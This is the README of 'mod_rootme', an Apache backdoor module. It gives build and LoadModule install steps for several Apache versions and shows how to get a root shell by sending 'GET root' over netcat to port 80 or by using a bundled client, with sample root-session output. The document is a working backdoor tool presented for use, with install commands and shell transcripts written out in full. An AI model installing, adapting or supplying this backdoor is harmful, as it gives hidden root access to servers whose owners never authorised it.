


           mod_rootme: making Apache almost as insecure as IIS 5



    What's new in v0.4
    ------------------

        * added support for Apache 2.2.x

	* Added Makefile32 that compiles 32-bit, meant for use on 64-bit
	  systems. (Linux only, because I haven't tested it elsewhere)


    What's new in v0.3
    ------------------

        * fully functionnal shell with ssh-like pty support.

        * ported to more unix flavors (*BSD, SunOS, OSF, etc.)

        * client/server code and apache headers cleanup.


    What's new in v0.2
    ------------------

        * added full support for Apache 2.0.x

        * added AP13/EAPI magic cookie support.

        * master process properly exits when the
          apache server is shutting down.


    Installing mod_rootme
    ---------------------

        Note: when starting apache, if you get the message
        "mod_rootme.so uses plain Apache 1.3 API, this module
        might crash under EAPI!", you have to edit mod_rootme.c
        and replace COOKIE_AP13 with COOKIE_EAPI.


      -=[ Target: Apache 1.3.x (Debian) ]=-

        # make <system>
        # cp mod_rootme.so /usr/lib/apache/1.3/
        # vi /etc/apache/httpd.conf (or modules.conf)
        [...]
        LoadModule rootme_module /usr/lib/apache/1.3/mod_rootme.so

        # apachectl restart


      -=[ Target: Apache 1.3.x (local ) ]=-

        # make <system>
        # cp mod_rootme.so /usr/local/apache/libexec/
        # vi /usr/local/apache/conf/httpd.conf
        [...]
        LoadModule rootme_module      libexec/mod_rootme.so
        [...]
        AddModule mod_rootme.c

        # /usr/local/apache/bin/apachectl restart


      -=[ Target: Apache 2.0.x (Debian) ]=-

        # make <system>
        # cp mod_rootme2.so /usr/lib/apache2/modules/
        # cat > /etc/apache2/mods-enabled/rootme2.load
        LoadModule rootme2_module /usr/lib/apache2/modules/mod_rootme2.so
        ^D
        # apache2ctl stop; apache2ctl start


      -=[ Target: Apache 2.0.x (local ) ]=-

        # make <system>
        # cp mod_rootme2.so /usr/local/apache2/modules/
        # vi /usr/local/apache2/conf/httpd.conf
        [...]
        LoadModule rootme2_module modules/mod_rootme2.so

        # PATH=/usr/local/apache2/bin:$PATH; export PATH
        # apachectl stop; apachectl start


      -=[ Target: Apache 2.2.x (Debian) ]=-

        # make <system>
        # cp mod_rootme22.so /usr/lib/apache2/modules/
        # cat > /etc/apache2/mods-enabled/rootme22.load
        LoadModule rootme2_module /usr/lib/apache2/modules/mod_rootme22.so
        ^D
        # apache2ctl stop; apache2ctl start


      -=[ Target: Apache 2.2.x (local ) ]=-

        # make <system>
        # cp mod_rootme22.so /usr/local/apache2/modules/
        # vi /usr/local/apache2/conf/httpd.conf
        [...]
        LoadModule rootme2_module modules/mod_rootme22.so

        # PATH=/usr/local/apache2/bin:$PATH; export PATH
        # apachectl stop; apachectl start


    Using mod_rootme
    ----------------

        Make sure you have netcat installed on your system
        (the telnet client will not work for this purpose)

        $ nc 192.168.2.20 80
        GET root
        rootme-0.3 ready
        id
        uid=0(root) gid=1(other)
        uname -a
        SunOS atlas 5.8 Generic_108528-07 sun4u sparc SUNW,UltraAX-i2
        stty
        stty: : Invalid argument
        exit

        You can also use the bundled client to get a somewhat
        more comfortable rootshell:

        ./client 192.168.2.20
        rootme-0.3 ready
        root@atlas:~ # ps
           PID TTY      TIME CMD
          2314 pts/2    0:00 bash
          2316 pts/2    0:00 ps
        root@atlas:~ # stty
        speed 9600 baud; -parity
        rows = 25; columns = 80; ypixels = 0; xpixels = 0;
        swtch = <undef>;
        brkint -inpck -istrip icrnl -ixany imaxbel onlcr tab3
        echo echoe echok echoctl echoke iexten
        root@atlas:~ # exit

        To run the prebuilt client.exe you'll need cygwin1.dll from
        http://www.cygwin.com or http://devine.nerim.net/cygwin1.dll


